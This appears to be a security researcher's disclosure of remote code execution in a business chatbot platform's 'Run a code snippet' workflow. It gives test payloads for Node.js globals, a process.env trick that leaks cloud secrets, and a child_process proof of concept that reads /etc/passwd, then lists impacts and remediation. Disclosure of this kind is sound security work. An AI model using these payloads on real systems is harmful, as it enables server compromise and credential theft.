### 📑 Remote Code Execution (RCE) via AI Chatbot Workflows

---

* **Severity:** 🔴 Critical
* **Researcher:** Anurag__Verma
* **Date:** August 5, 2024
* **Target:** Popular AI Chatbot / Business Management Platform
* **Platform Environment:** Node.js 18.x

---

### 📖 Executive Summary

During a security assessment of a business management platform, a **Remote Code Execution (RCE)** vulnerability was discovered within the AI chatbot’s "custom workflow" feature. The platform allowed users to extend chatbot functionality by writing custom code snippets. However, a lack of proper sandboxing allowed for the execution of arbitrary system commands and the leakage of sensitive environment variables.

### 🛠 Discovery & Technical Details

The vulnerability was located in the **"Start from scratch"** automation feature, specifically within the **"Run a code snippet"** option.

#### Initial Testing (Node.js Globals)

The default code snippet provided by the platform was:

```javascript
const responseJson = {
  botMessage: "Hello world",
  responseExpected: false
}

```

Since the backend was running **Node.js 18.x**, the researcher tested if global variables and functions were accessible by injecting them into the `botMessage` value.

| Test Payload | Output / Result | Implications |
| --- | --- | --- |
| `botMessage: __dirname` | `/var/task` | Internal directory structure revealed. |
| `botMessage: __filename` | `/var/task/Template.js` | Specific file path identified. |
| `botMessage: eval(7*7)` | `49` | Arbitrary JavaScript execution confirmed. |

#### Information Leakage (Process Object)

By leveraging the Node.js `process` global object, the researcher was able to extract sensitive system information:

* **Environment Variables:** `process.env` (Can leak `AWS_SECRET`, `AWS_KEY`, etc.)
* **Platform Info:** `process.platform`
* **Execution Path:** `process.execPath`
* **Resource Usage:** `process.memoryUsage()` and `process.cpuUsage()`

---

### 💻 Proof of Concept (PoC)

The final objective was to achieve full RCE by spawning a child process to execute shell commands.

#### Full RCE Payload

By importing the `child_process` module, the researcher successfully executed system-level commands:

```javascript
const { exec } = require('child_process');

exports.main = (event, callback) => {
    // Executing 'head /etc/passwd' to read local system files
    exec('head /etc/passwd', (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }

        const responseJson = {
          botMessage: stdout, // Command output sent back to chatbot UI
          responseExpected: false
        };

        callback(responseJson);
    });
};

```

> [!IMPORTANT]
> **Successful Execution Results:**
> * **Local File Read:** Successfully retrieved the contents of `/etc/passwd`.
> * **System Identity:** Successfully executed the `id` command, confirming the user context of the running process.
> 
> 

---

### 📉 Impact & Exploitation

* **Full System Compromise:** An attacker can execute any command the underlying server user has permissions for.
* **Data Breach:** Access to `process.env` often reveals cloud provider credentials (AWS/Azure/GCP), database strings, and API keys.
* **Lateral Movement:** The attacker could use the compromised container/server to attack other internal infrastructure.

### 🛡️ Remediation

1. **Secure Sandboxing:** Custom code should be executed in a highly restricted, isolated environment (e.g., using `vm2`—though now deprecated—or dedicated serverless containers with no access to sensitive globals).
2. **Disable Dangerous Modules:** Restrict access to `require('child_process')`, `fs`, and other sensitive Node.js modules.
3. **Principle of Least Privilege:** Ensure the execution environment has zero access to environment variables unless explicitly required and scoped.
